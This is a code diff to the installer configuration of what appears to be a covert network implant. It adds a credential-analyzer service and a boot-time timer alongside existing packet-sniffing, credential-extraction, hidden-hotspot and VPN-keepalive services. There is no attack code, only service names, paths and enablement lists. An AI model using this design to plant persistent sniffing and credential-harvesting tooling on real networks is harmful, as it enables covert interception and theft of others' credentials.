@@ -22,22 +22,25 @@ from .ui import UI
 # ---------------------------------------------------------------------------
 _SYSTEMD_UNITS: dict[str, str] = {
     # services
-    "bridge-sync.service":       "/opt/implant/services/bridge-sync.service",
-    "bruteshark.service":        "/opt/implant/services/bruteshark.service",
-    "discord.service":           "/opt/implant/services/discord.service",
-    "hidden-hotspot.service":    "/opt/implant/services/hidden-hotspot.service",
-    "packet-sniffer.service":    "/opt/implant/services/packet-sniffer.service",
-    "power-monitor.service":     "/opt/implant/services/power-monitor.service",
-    "wg-keepalive.service":      "/opt/implant/services/wg-keepalive.service",
+    "bridge-sync.service":              "/opt/implant/services/bridge-sync.service",
+    "bruteshark.service":               "/opt/implant/services/bruteshark.service",
+    "discord.service":                  "/opt/implant/services/discord.service",
+    "hidden-hotspot.service":           "/opt/implant/services/hidden-hotspot.service",
+    "openclaw-cred-analyzer.service":   "/opt/implant/services/openclaw-cred-analyzer.service",
+    "packet-sniffer.service":           "/opt/implant/services/packet-sniffer.service",
+    "power-monitor.service":            "/opt/implant/services/power-monitor.service",
+    "wg-keepalive.service":             "/opt/implant/services/wg-keepalive.service",
     # timers
-    "bridge-sync.timer":         "/opt/implant/timers/bridge-sync.timer",
-    "power-monitor.timer":       "/opt/implant/timers/power-monitor.timer",
-    "wg-keepalive.timer":        "/opt/implant/timers/wg-keepalive.timer",
+    "bridge-sync.timer":                "/opt/implant/timers/bridge-sync.timer",
+    "openclaw-cred-analyzer.timer":     "/opt/implant/timers/openclaw-cred-analyzer.timer",
+    "power-monitor.timer":              "/opt/implant/timers/power-monitor.timer",
+    "wg-keepalive.timer":               "/opt/implant/timers/wg-keepalive.timer",
 }
 
 # Timers to ALWAYS enable at boot (safe regardless of config)
 _ENABLE_TIMERS_ALWAYS = [
     "bridge-sync.timer",
+    "openclaw-cred-analyzer.timer",
     "power-monitor.timer",
 ]
 
@@ -55,6 +58,7 @@ _ENABLE_SERVICES = [
 # Logrotate entries  (name -> log path)
 _LOGROTATE: dict[str, str] = {
     "bridge-sync":   "/opt/implant/logs/bridge-sync/bridge-sync.log",
+    "openclaw":      "/opt/implant/logs/openclaw/*.json",
     "wg-keepalive":  "/opt/implant/logs/wg-keepalive/wg-keepalive.log",
     "power-monitor": "/opt/implant/logs/power-monitor/power-monitor.log",
 }
